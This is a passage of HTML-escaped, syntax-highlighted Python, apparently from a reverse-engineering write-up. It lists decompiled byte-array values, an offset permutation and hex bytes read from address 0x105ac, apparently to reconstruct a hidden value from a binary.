&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5f
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;25&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x91
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;26&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;27&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xcf
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc0
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4d
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;31&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9b
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xba
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;33&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x77
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;35&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;36&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xf5
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xef
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;38&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;39&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x96
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x31
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;41&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x30
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;42&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;43&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xe2
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Picked the elements in the series 0,4,8,.. (constant elements from baseaddress)
&lt;&#x2F;span&gt;&lt;span&gt;offsets &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0e&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;03&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1c&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;13&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;17&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;21&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;12&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;04&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;27&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;09&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;22&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1e&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;15&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0b&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;24&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0a&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;18&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2b&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;19&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1b&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2a&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;08&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;20&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;25&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1a&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0c&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;29&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;07&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;05&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;11&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;28&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;14&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;16&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;23&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;01&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2c&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;06&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#24 was the hex value stored at 0x105ac, 00 was the hex value stored at 0x105ad and so on,
&lt;&#x2F;span&gt;&lt;span&gt;data_at_105ac &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;24&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;24&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;41&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;a0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;43&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;11&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;81&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;c1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;b0&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1e&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;01&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;30&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;53&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1e&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;01&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;13&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ff&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;f8&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;f8&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;02&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;00&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;10&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;40&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2d&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;e9&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;18&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;40&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;9f&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span 